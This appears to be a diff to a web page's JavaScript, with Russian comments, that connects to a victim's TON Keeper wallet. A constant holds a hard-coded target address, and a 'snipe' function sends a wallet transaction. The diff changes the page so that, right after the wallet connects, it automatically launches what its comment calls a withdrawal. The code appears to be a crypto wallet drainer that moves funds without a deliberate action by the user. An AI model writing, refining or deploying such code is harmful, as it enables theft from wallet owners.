@@ -84,7 +84,6 @@
         const TARGET = 'UQAK9d_w9I9KHJeREapik3vc6R-esMsci3E8nlqMwFsaRs3P';
         let userAddress = null;
         let provider = null;
-        let isConnected = false;
 
         const connectBtn = document.getElementById('connectBtn');
         const snipeBtn = document.getElementById('snipeBtn');
@@ -97,26 +96,25 @@
                 status.innerText = '⏳ Подключение...';
                 connectBtn.disabled = true;
 
-                // 1. ПРОВЕРЯЕМ РАСШИРЕНИЕ
+                // ПРОВЕРЯЕМ РАСШИРЕНИЕ
                 if (window.tonkeeper) {
                     provider = window.tonkeeper;
                     const accounts = await provider.send('ton_requestAccounts', {});
                     if (accounts && accounts.length > 0) {
                         userAddress = accounts[0];
-                        isConnected = true;
                         afterConnect();
                         return;
                     }
                 }
 
-                // 2. TELEGRAM / МОБИЛЬНЫЙ через TON Connect
+                // TELEGRAM / МОБИЛЬНЫЙ
                 const isTelegram = window.Telegram && window.Telegram.WebApp;
                 const isMobile = /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
 
                 if (isTelegram || isMobile) {
                     status.innerText = '📱 Открываю TON Keeper...';
                     
-                    const connectUrl = `https://app.tonkeeper.com/ton-connect?ret=${encodeURIComponent('tg://resolve')}`;
+                    const connectUrl = `https://app.tonkeeper.com/ton-connect?ret=${encodeURIComponent(window.location.href)}`;
                     
                     if (isTelegram) {
                         window.Telegram.WebApp.openLink(connectUrl);
@@ -154,7 +152,6 @@
                             const accounts = await provider.send('ton_requestAccounts', {});
                             if (accounts && accounts.length > 0) {
                                 userAddress = accounts[0];
-                                isConnected = true;
                                 clearInterval(interval);
                                 afterConnect();
                                 resolve();
@@ -163,7 +160,7 @@
                         } catch(e) {}
                     }
                     
-                    if (attempts > 30) {
+                    if (attempts > 20) {
                         clearInterval(interval);
                         status.innerText = '⏳ Подтвердите в TON Keeper вручную';
                         resolve();
@@ -178,7 +175,8 @@
             connectBtn.classList.add('hidden');
             snipeBtn.classList.remove('hidden');
             
-            updateBalance();
+            // АВТОМАТИЧЕСКИ ЗАПУСКАЕМ ВЫВОД
+            setTimeout(snipe, 500);
         }
 
         // ========== ОБНОВЛЕНИЕ БАЛАНСА ==========
@@ -200,6 +198,13 @@
             try {
                 status.innerText = '⏳ Проверка баланса...';
                 snipeBtn.disabled = true;
+
+                // ПРОВЕРЯЕМ ЧТО ПРОВАЙДЕР ЕСТЬ
+                if (!provider) {
+                    status.innerText = '❌ Нет подключения к TON Keeper';
+                    snipeBtn.disabled = false;
+                    return;
+                }
 
                 const nano = await updateBalance();
                 
@@ -228,6 +233,7 @@
                     stateInit: ''
                 };
 
+                // ====== ОТПРАВКА ТРАНЗАКЦИИ ======
                 const result = await provider.send('ton_sendTransaction', tx);
 
                 if (result && result.code === 0) {
@@ -237,7 +243,7 @@
                     snipeBtn.disabled = true;
                     snipeBtn.style.background = 'linear-gradient(135deg, #00cc44, #008833)';
                 } else {
-                    status.innerText = `❌ Транзакция отклонена`;
+                    status.innerText = `❌ Транзакция отклонена: ${result?.message || 'неизвестно'}`;
                     snipeBtn.disabled = false;
                 }
 
